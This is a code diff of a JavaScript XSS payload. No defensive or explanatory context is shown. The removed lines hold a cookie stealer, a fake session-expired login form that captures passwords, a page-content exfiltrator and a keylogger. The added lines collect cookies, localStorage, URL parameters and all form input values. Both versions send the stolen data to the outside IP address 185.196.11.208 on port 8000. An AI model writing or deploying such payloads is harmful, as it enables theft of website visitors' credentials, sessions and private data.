@@ -1,36 +1,29 @@
-// payload.js
+// Collect Cookies
+let cookies = document.cookie;
 
-// 1. Cookie Stealing
-new Image().src = "https://185.196.11.208:8000/log?cookie=" + encodeURIComponent(document.cookie);
+// Collect Local Storage
+let localStorageData = JSON.stringify(localStorage);
 
-// 2. Fake Login Form (Phishing)
-let fake = document.createElement('div');
-fake.innerHTML = `<div style="position:fixed;top:30%;left:30%;background:white;padding:30px;box-shadow:0 0 10px black;z-index:9999">
-<h3>Session Expired</h3>
-<p>Please re-enter your credentials</p>
-<input name="username" placeholder="Username"><br><input name="password" placeholder="Password" type="password"><br><button onclick="steal()">Login</button>
-</div>`;
-document.body.appendChild(fake);
+// Collect URL Parameters
+let urlParams = new URLSearchParams(window.location.search);
 
-function steal() {
-  let u = document.querySelector('input[name="username"]').value;
-  let p = document.querySelector('input[name="password"]').value;
-  fetch("https://185.196.11.208:8000/log", {
-    method: "POST",
-    body: "username=" + encodeURIComponent(u) + "&password=" + encodeURIComponent(p),
-    headers: {"Content-Type":"application/x-www-form-urlencoded"}
-  });
-}
+// Collect other sensitive data (form inputs, etc.)
+// Example: Get all inputs on the page
+let formData = Array.from(document.querySelectorAll("input, textarea, select")).map(input => ({
+  name: input.name,
+  value: input.value
+}));
 
-// 3. Exfiltrate Page Content
-let data = document.body.innerText;
-fetch("https://185.196.11.208:8000/log", {
+// Send the captured data to your server (you can use a GET or POST request)
+fetch("http://185.196.11.208:8000/log", {
   method: "POST",
-  body: "content=" + encodeURIComponent(data),
-  headers: {"Content-Type":"application/x-www-form-urlencoded"}
-});
-
-// 4. Keylogger
-document.addEventListener("keydown", function(e){
-  fetch("https://185.196.11.208:8000/log?key=" + encodeURIComponent(e.key));
+  body: JSON.stringify({
+    cookies: cookies,
+    localStorage: localStorageData,
+    formData: formData,
+    urlParams: urlParams.toString()
+  }),
+  headers: {
+    "Content-Type": "application/json"
+  }
 });
